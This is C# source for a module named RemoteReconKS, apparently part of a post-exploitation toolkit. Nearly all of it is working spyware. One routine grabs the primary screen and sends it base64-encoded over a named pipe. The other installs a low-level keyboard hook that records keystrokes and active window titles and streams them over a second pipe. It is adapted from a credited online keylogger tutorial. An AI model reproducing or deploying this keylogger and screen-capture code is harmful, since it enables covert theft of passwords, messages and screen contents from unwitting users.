using System;
using System.IO;
using System.IO.Pipes;
using System.Windows.Forms;
using System.Drawing;
using System.Drawing.Imaging;
using System.Threading;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;

namespace RemoteReconKS
{
    public class RemoteReconKS
    {
#if DEBUG
        private static string logpath = @"C:\Windows\tasks\keylog.log";
#endif
        private static NamedPipeServerStream server;
        private static NamedPipeClientStream client;
        private static byte[] key;
        private static StreamWriter sw;
        private static StringBuilder wndText = new StringBuilder();

        public static void Execute(string capability)
        {
            if (capability.ToLower() == "screenshot")
            {
                try
                {
                    server = new NamedPipeServerStream("svc_ss", PipeDirection.InOut, 1, PipeTransmissionMode.Message);
                    server.WaitForConnection();
                    sw = new StreamWriter(server);

                    //byte[] image = screenshot();
                    sw.WriteLine(screenshot());
                    Thread.Sleep(5000);
                    sw.Flush();

                    server.Close();
                }
                catch (Exception)
                {
#if DEBUG
                    File.AppendAllText(logpath, e.ToString());
#endif
                    Application.ExitThread();
                }
                
            }
            else if(capability.ToLower() == "keylog")
            {
                StartKeylogger();
            }
        }

        //https://stackoverflow.com/questions/362986/capture-the-screen-into-a-bitmap
        private static string screenshot()
        {

            try
            {
                string encImage;
                var screenshotobject = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
                var DrawingGraphics = Graphics.FromImage(screenshotobject);

                DrawingGraphics.CopyFromScreen(Screen.PrimaryScreen.Bounds.X, Screen.PrimaryScreen.Bounds.Y, 0, 0, screenshotobject.Size, CopyPixelOperation.SourceCopy);
                DrawingGraphics.Dispose();

                MemoryStream ms = new MemoryStream();
                screenshotobject.Save(ms, ImageFormat.Png);
                byte[] imgBytes = ms.ToArray();
                encImage = Convert.ToBase64String(imgBytes);
                return encImage;
            }
            catch (Exception e)
            {
#if DEBUG
                File.AppendAllText(logpath, e.ToString());
#endif
                return Convert.ToBase64String(Encoding.ASCII.GetBytes(e.ToString()));
            }
        }

        private static void StartKeylogger()
        {
            //Start a background thread for the keylogger
            WinApi._hookID = SetHook(WinApi._proc);
            
            try
            {
                client = new NamedPipeClientStream(".", "svc_kl", PipeDirection.Out);
                client.Connect(5000);
                Application.Run();
                WinApi.UnhookWindowsHookEx(WinApi._hookID);
                Application.ExitThread();
            }
            catch (Exception e)
            {
#if DEBUG
                File.AppendAllText(logpath, e.ToString());
#endif
            }
            
        }

        //Keylogger logic/code from: https://null-byte.wonderhowto.com/how-to/create-simple-hidden-console-keylogger-c-sharp-0132757/
        private static IntPtr SetHook(WinApi.LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            {
                using (ProcessModule curModule = curProcess.MainModule)
                {
                    return WinApi.SetWindowsHookEx(WinApi.WH_KEYBOARD_LL, proc, WinApi.GetModuleHandle(curModule.ModuleName), 0);
                }
            }
        }

        public static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            byte[] keyboardState = new byte[256];
            StringBuilder modKey = new StringBuilder();
            IntPtr kblh = WinApi.GetKeyboardLayout(Process.GetCurrentProcess().Id);

            //Get the current foreground window
            IntPtr hWindow = GetForegroundWindow();
            string oldWndTxt = wndText.ToString();
            int res = GetWindowText(hWindow, wndText, wndText.Capacity);

            //Check to see if the window has changed
            if (oldWndTxt.ToLower() != wndText.ToString().ToLower())
                modKey.Append(" \r\n{" + wndText.ToString().Split('-')[0] + "}\r\n ");

            if (nCode >= 0 && (wParam == (IntPtr)WinApi.WM_KEYDOWN || wParam == (IntPtr)WinApi.WM_SYSKEYDOWN))
            {
                int vkCode = Marshal.ReadInt32(lParam);
                //Catch modifier keys and append a string representation.

                switch ((Keys)vkCode)
                {
                    case Keys.Space:
                        modKey.Append(" ");
                        break;
                    case Keys.RControlKey:
                        modKey.Append(" [RCTRL] ");
                        break;
                    case Keys.LControlKey:
                        modKey.Append(" [LCTRL] ");
                        break;
                    case Keys.LWin:
                        modKey.Append(" [WIN] ");
                        break;
                    case Keys.Tab:
                        modKey.Append(" [TAB] ");
                        break;
                    case Keys.Back:
                        modKey.Append(" [BKSP] ");
                        break;
                    case Keys.Enter:
                        modKey.Append(" [ENT] ");
                        break;
                    default:
                        break;
                }

               
                
                //Check if the shift modifier was used
                bool shiftMod = Convert.ToBoolean((int)WinApi.GetAsyncKeyState(Keys.ShiftKey) & 32768);
                var scancode = WinApi.MapVirtualKeyEx((uint)vkCode, 0x04, kblh);

                if (scancode > 0)
                {

                    if (shiftMod)
                    {
                        keyboardState[(int)Keys.ShiftKey] = 0x80;
                        keyboardState[(int)Keys.LShiftKey] = 0x80;
                        keyboardState[(int)Keys.RShiftKey] = 0x80;
                    }

                    var s = new StringBuilder(256);
                    var returnCode = WinApi.ToUnicodeEx((uint)vkCode, scancode, keyboardState, s, s.Capacity, 0, kblh);
                    modKey.Append(s.ToString());
                    if (client.IsConnected)
                    {
                        key = Encoding.UTF8.GetBytes(modKey.ToString());

                        try
                        {
                            client.Write(key, 0, key.Length);
                            client.Flush();
                        }
                        catch (Exception e)
                        {
#if DEBUG
                            File.AppendAllText(logpath, e.ToString());
#endif
                            Application.ExitThread();
                        }
                    }
                    else
                    {
                        Application.ExitThread();
                    }

                    modKey.Remove(0, modKey.Length);

                }
                else
                {
                    var s = new StringBuilder(5);
                    var returnCode = WinApi.ToUnicodeEx((uint)vkCode, scancode, keyboardState, s, s.Capacity, 0, kblh);
                }
            }

            
            return WinApi.CallNextHookEx(WinApi._hookID, nCode, wParam, lParam);
        }

        [DllImport("user32.dll", SetLastError = true)]
        private static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll", SetLastError = true)]
        private static extern Int32 GetWindowText(IntPtr hWindow, StringBuilder lpString, int nMaxCount);
    }
}
